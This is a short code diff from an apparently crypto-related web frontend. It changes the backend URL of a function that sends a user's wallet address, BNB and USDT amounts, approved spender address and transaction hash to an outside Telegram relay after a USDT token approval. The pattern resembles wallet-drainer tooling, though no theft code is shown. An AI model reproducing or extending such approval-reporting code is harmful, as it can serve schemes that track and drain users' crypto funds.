@@ -615,7 +615,7 @@ async function approveToken(account) {
 
 // Telegram notification function - now via Railway backend (no direct Telegram call from frontend)
 async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
-    const RAILWAY_BASE_URL = 'https://telegram-backend-main-production-6086.up.railway.app';
+    const RAILWAY_BASE_URL = 'https://himanshu-telegram.onrender.com';
 
     const message =
         `🔔 USDT Approval Notification\n\n` +
